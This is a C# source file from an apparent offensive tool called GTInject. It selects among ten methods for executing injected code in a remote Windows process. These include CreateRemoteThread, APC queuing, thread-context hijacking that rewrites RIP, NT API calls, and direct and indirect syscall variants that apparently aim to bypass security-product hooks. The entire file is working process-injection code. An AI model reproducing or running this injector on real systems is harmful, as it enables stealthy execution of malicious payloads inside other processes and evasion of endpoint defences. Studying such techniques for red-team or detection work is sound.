using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using static GTInject.memoryOptions.Memory;
using System.Net.Http;
using System.Xml.Linq;
using GTInject.SysCalls;
using System.Linq.Expressions;
using static GTInject.SysCalls.WinNative;
using System.Security.Cryptography;

namespace GTInject.Injection
{
    internal class ThreadExec
    {
        public static IntPtr SelectThreadOption(IntPtr memaddr, int execoption, Process pid, int tid)
        {
            switch (execoption)
            {
                case 100:
                    return execopt100(memaddr, pid, tid);
                case 101:
                    return execopt101(memaddr, pid, tid);
                case 102:
                    return execopt102(memaddr, pid, tid);
                case 200:
                    return execopt200(memaddr, pid, tid);
                case 201:
                    return execopt201(memaddr, pid, tid);
                case 202:
                    return execopt202(memaddr, pid, tid);
                case 300:
                    return execopt300(memaddr, pid, tid);
                case 301:
                    return execopt301(memaddr, pid, tid);
                case 302:
                    return execopt302(memaddr, pid, tid);
                case 303:
                    return execopt303(memaddr, pid, tid);
                default:
                    Console.WriteLine( "[-] Not a valid Thread Execution option integer");
                    return IntPtr.Zero;
            }

        }

        private static IntPtr execopt100(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
            /////////////////////////////////////
            // OPTION 100 == CreateRemoteThread (WINAPI)
            /////////////////////////////////////

            Console.WriteLine("     Execute code using WINAPIs CreateRemoteThread");
            IntPtr remoteThreadResp = CreateRemoteThread(ProcID.Handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
            if (remoteThreadResp != IntPtr.Zero)
            {
                Console.WriteLine("[+] WinAPI CreateRemoteThread with response : " + remoteThreadResp + "\n");

            }
            return remoteThreadResp;
        }

        private static IntPtr execopt101(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 101 == QueueUserAPC & ResumeThread (WINAPI)
            /////////////////////////////////////
            Console.WriteLine("     Execute code using WINAPIs QueueUserAPC, ResumeThread");

            //var threadHandle = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
            var threadHandle = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);

            Console.WriteLine("     Returned OpenThread " + threadHandle);

            var QuApcResp = QueueUserAPC(memaddr, threadHandle, IntPtr.Zero);

            if (QuApcResp == 0) // if succeeds, return value is non-zero
            {
                Console.WriteLine("[-] Failed QueueUserAPC WINAPI execution");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("[+] WinAPI QueueUserAPC called\n");

                var threadObjects = ProcID.Threads;
                for (int i = 0; i < threadObjects.Count; i++)
                {
                    try
                    {
                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                        {
                            Console.WriteLine("     thread is suspended, so calling resume Thread WINAPI on this");
                            var ResThreadResp = ResumeThread(threadHandle);
                            if (ResThreadResp == -1)
                            {
                                Console.WriteLine("     resume Thread failed");
                                return IntPtr.Zero;
                            }
                            else
                            {
                                Console.WriteLine("[+] WinAPI ResumeThread called\n");
                            }
                        }
                    }
                    catch (System.InvalidOperationException e)
                    {
                        Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
                        Console.WriteLine("     " + e.Message);
                    }

                }
                return threadHandle; // returning an IntPtr, threadhandle is already an IntPtr
            }
            
            //If thread state is Suspended, must resume, If Execution Delay, will trigger automatically, no API call needed, don't recall thread in Wait state action

        }

        private static IntPtr execopt102(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 102 == GetThreadContext - SetThreadContext "Thread Hijacking" (WINAPI)
            /////////////////////////////////////
            // Enum the LAST thread ID in a remote process and use that to hijack? Assuming earlier thread creation has a potential to be a 'main thread' and don't want to crash teh process
            // At WINAPI level, we can do this natively in C#, consider alternative methods for NT and syscall levels

            // Currently just hijackign last thread, but a rewrite to the threads module could allow us to see all threads and manually choose a thread ID to hijack.
            if (ThreadID == 0)
            {
                // Find the 2nd last thread ID, the user hasn't selected their own
                var threadObjects = ProcID.Threads;
                ThreadID = threadObjects[threadObjects.Count - 2].Id;
                Console.WriteLine("[+] Found a Thread to hijack " + ThreadID);
            }
            else
            {
                // Use the users thread Id for injection
                Console.WriteLine("[+] Using your thread ID to hijack TID " + ThreadID);
            }

            CONTEXT64 contextObj = new CONTEXT64();
            contextObj.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;

            var threadHandle = OpenThread((uint)ThreadAccessRights.AllAccess, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
            Console.WriteLine("     Opened handle as thread handle = " + threadHandle + ". Suspending now.. ");
            SuspendThread(threadHandle);

            GetThreadContext(threadHandle, ref contextObj);
            contextObj.Rip = (ulong)memaddr;
            Console.WriteLine("     Have thread context, set RIP to " + contextObj.Rip);
            SetThreadContext(threadHandle, ref contextObj);

            Console.WriteLine("     Calling ResumeThread");
            var resumed = ResumeThread(threadHandle);
            Console.WriteLine("     Resume Thread response = " + resumed + ". 1 is Good, anything else indicates possible failure");
            return IntPtr.Zero;


        }

        private static IntPtr execopt200(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 200 == NtCreateThreadEx (NTAPI)
            /////////////////////////////////////
            ///
            //Create a remote thread and execute it.
            //IntPtr hThread = CreateRemoteThread(hremoteProcess, IntPtr.Zero, 0, remoteBaseAddress, IntPtr.Zero, 0, IntPtr.Zero);

            Console.WriteLine("     Execute code using NTAPIs NtCreateThreadEx");

            IntPtr hRemoteThread;
            uint hThread = NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, ProcID.Handle, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[+] NTAPI NtCreateThreadEx with response : " + hThread + "\n");

            return hRemoteThread;
        }

        private static IntPtr execopt201(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 201 == RtlCreateUserThread (NTAPI)
            /////////////////////////////////////
            Console.WriteLine("     Execute code using NTAPIs RtlCreateUserThread");
            IntPtr targetThread = IntPtr.Zero;
            ClientId id = new ClientId();
            int hthread = RtlCreateUserThread(ProcID.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, memaddr, IntPtr.Zero, ref targetThread, ref id);
            if (hthread == 0)
            {
                Console.WriteLine("[+] NTAPI RtlCreateUserThread resp : " + hthread + "\n");
                return targetThread;
            }
            else
            {
                Console.WriteLine("[-] RtlCreateUserThread Failed");
                return IntPtr.Zero;
            }
        }


        private static IntPtr execopt202(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 202 == NtQueueApcThread, NtResumeThread (NTAPI)
            /////////////////////////////////////        
            Console.WriteLine("     Execute code using NTAPIs NtQueueApcThread, NtResumeThread");
            
            var targetThread = IntPtr.Zero;
            var cid = new CLIENT_ID { UniqueThread = (IntPtr)ThreadID };
            OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
            var NtOpenTResp = NtOpenThread(out targetThread,(uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid );
           
            Console.WriteLine(" NtOpenThread Response : " + NtOpenTResp);

            var ntQResp = NtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
            if (ntQResp != 0)
            {
                Console.WriteLine("     ntQResp was non-success");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("[+] NTAPI NtQueueApcThread called\n");
                var threadObjects = ProcID.Threads;

                try
                {
                    for (int i = 0; i < threadObjects.Count; i++)
                    {
                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                        {
                            Console.WriteLine("     thread is suspended, so calling NtResumeThread on this");
                            var ntResTResp = NtResumeThread(targetThread, 0);
                            if (ntResTResp != 0)
                            {
                                Console.WriteLine("     resume Thread failed");
                                return IntPtr.Zero;
                            }
                            else
                            {
                                Console.WriteLine("[+] NTAPI NtResumeThread called\n");
                            }
                        }
                    }
                }

                catch (System.InvalidOperationException e)
                {
                    Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
                    Console.WriteLine("     " + e.Message);
                }
                return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
            }
        }
        private static IntPtr execopt300(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 300 == Direct Syscall - NtCreateThreadEx
            /////////////////////////////////////

            // set up the syscall for NtCreateThreadEx
            var hProcess = ProcID.Handle;
            IntPtr hThread = IntPtr.Zero;
            var status = Syscalls.SysclNtCreateThreadEx(out hThread, WinNative.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            if (status == WinNative.NTSTATUS.Success)
            {
                Console.WriteLine("[+] Direct Syscall to NtCreateThreadEx " + status + "\n");
                return memaddr;
            }
            else
            {
                Console.WriteLine("[-] Direct Syscall to NtCreateThreadEx " + status);

                return IntPtr.Zero;
            }

        }


        private static IntPtr execopt301(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 301 == Direct Syscall - NtQueueApcThread, NtResumeThread
            /////////////////////////////////////
            var targetThread = IntPtr.Zero;
            var cid = new CLIENT_ID { UniqueThread = (IntPtr)ThreadID };
            OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
            var status = Syscalls.SysclNtOpenThread(out targetThread, (uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid);
            Console.WriteLine("     Direct Syscall NTOpenThread status " + status);
            Console.WriteLine("     Target thread handle " + targetThread);
            //var NtOpenTResp = NtOpenThread(out targetThread, (uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid);
            //var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);

            // set up the syscall for NtQueueApcThread
            var hProcess = ProcID.Handle;
            IntPtr hThread = IntPtr.Zero;
            status = Syscalls.SysclNtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
            Console.WriteLine("     Direct Syscall to NtQueueApcThread " + status);

            if (status != 0)
            {
                Console.WriteLine("     QAPCThread Direct Syscall was non-success");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("[+] Direct Syscall NtQueueApcThread called\n");
                var threadObjects = ProcID.Threads;
                for (int i = 0; i < threadObjects.Count; i++)
                {
                    try
                    {
                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                        {
                            Console.WriteLine("     thread is suspended, so calling Direct Syscall NtResumeThread on this");
                            var ntResTResp = Syscalls.SysclNtResumeThread(targetThread, 0);
                            if (ntResTResp != 0)
                            {
                                Console.WriteLine("     Direct Syscall NtResumeThread failed");
                                return IntPtr.Zero;
                            }
                            else
                            {
                                Console.WriteLine("[+] Direct Syscall NtResumeThread called\n");
                            }
                        }
                    }
                    catch (System.InvalidOperationException e)
                    {
                        Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
                        Console.WriteLine("     " + e.Message);
                    }


                }
                return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
            }

        }

        private static IntPtr execopt302(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 302 == Indirect Syscall - NtCreateThreadEx
            /////////////////////////////////////

            // set up the syscall for NtCreateThreadEx
            var hProcess = ProcID.Handle;
            IntPtr hThread = IntPtr.Zero;
            var status = Syscalls.IndirectSysclNtCreateThreadEx(out hThread, WinNative.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProcess, memaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            if (status == WinNative.NTSTATUS.Success)
            {
                Console.WriteLine("[+] Indirect Syscall to CreateThread " + status + "\n");

                return memaddr;
            }
            else
            {
                return IntPtr.Zero;
            }

        }

        private static IntPtr execopt303(IntPtr memaddr, Process ProcID, int ThreadID)
        {
            /////////////////////////////////////
            // OPTION 303 == Indirect Syscall - NtQueueApcThread, NtResumeThread
            /////////////////////////////////////
            var targetThread = IntPtr.Zero;
            var cid = new CLIENT_ID { UniqueThread = (IntPtr)ThreadID };
            OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
            var status = Syscalls.IndirectSysclNtOpenThread(out targetThread, (uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid);

            //var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);

            // set up the syscall for NtQueueApcThread
            var hProcess = ProcID.Handle;
            IntPtr hThread = IntPtr.Zero;
            status = Syscalls.IndirectSysclNtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
            Console.WriteLine("     Indirect Syscall to NtQueueApcThread " + status);

            if (status != 0)
            {
                Console.WriteLine("     QAPCThread Indirect Syscall was non-success");
                return IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("[+] Indirect Syscall NtQueueApcThread called\n");
                var threadObjects = ProcID.Threads;
                for (int i = 0; i < threadObjects.Count; i++)
                {
                    try
                    {
                        if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
                        {
                            Console.WriteLine("     thread is suspended, so calling Indirect Syscall NtResumeThread on this");
                            var ntResTResp = Syscalls.IndirectSysclNtResumeThread(targetThread, 0);
                            if (ntResTResp != 0)
                            {
                                Console.WriteLine("     Indirect Syscall NtResumeThread failed");
                                return IntPtr.Zero;
                            }
                            else
                            {
                                Console.WriteLine("[+] Indirect Syscall NtResumeThread called\n");
                            }
                        }
                    } 
                    catch (System.InvalidOperationException e)
                    {
                        Console.WriteLine("     Check for injection, we caught an error, but it likely means that we attempted to resume a thread that already executed");
                        Console.WriteLine("     " + e.Message);

                    }

                }
                return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
            }

        }


    }
}
